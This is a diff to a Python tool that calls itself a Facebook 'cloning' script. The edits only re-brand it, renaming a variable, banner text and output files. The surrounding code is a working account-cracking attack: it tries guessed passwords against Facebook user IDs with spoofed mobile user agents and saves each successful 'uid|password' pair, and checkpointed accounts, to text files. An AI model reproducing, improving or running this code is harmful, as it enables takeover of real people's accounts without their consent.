@@ -406,7 +406,7 @@ _____         _____
 
 \033[1;93m Facebook: Asad Ali AnsaRi
 
-\033[1;93m YOUTUBE : MenTal Brand
+\033[1;93m YOUTUBE : MFG Brand
 
 \033[1;91m ASAD ALI ANSARI WELLCOME TO MY WORLD
 \033[0;95m═══════════════════════════════════════════
@@ -431,16 +431,16 @@ class Main:
 		print(" \033[0;94m[4] Cloning Old Idz 2008-10 \033[0;94m~[No login]")
 		print(" [5] Cloning Old Idz 2011-21\033[0;94m ~[No login]")
 		print("\033[0;91m [E] Exit \n")
-		Mrdevil =input(" \033[0;93mChoose : ")
-		if Mrdevil in ["1", "01"]:
+		ASAD =input(" \033[0;93mChoose : ")
+		if ASAD in ["1", "01"]:
 			File()
-		if Mrdevil in ["2", "02"]:
+		if ASAD in ["2", "02"]:
 			Public()
-		if Mrdevil in ["3", "03"]:
+		if ASAD in ["3", "03"]:
 			os.system("python2 mrd1.py")
-		if Mrdevil in ["4", "04"]:
+		if ASAD in ["4", "04"]:
 			self.old()
-		if Mrdevil in ["5", "05"]:
+		if ASAD in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -847,7 +847,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [Start]%s> /count>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.ok))
+			"\r [ASAD]%s> /count>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -867,12 +867,12 @@ class Main:
 				print("\r \033[0;92m[ASAD ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009Asad-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009ASAD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ASAD] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009Asad-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009ASAD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1278,7 +1278,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [Start]>%s/COUNT>%s -> OK:-%s - CP:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ASAD]>%s/COUNT>%s -> OK:-%s - CP:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1298,12 +1298,12 @@ class Main:
 				print("\r \033[0;92m[ASAD ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009Asad-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009ASAD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;93m[ASAD] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009Asad-Cp.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009ASAD-Cp.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
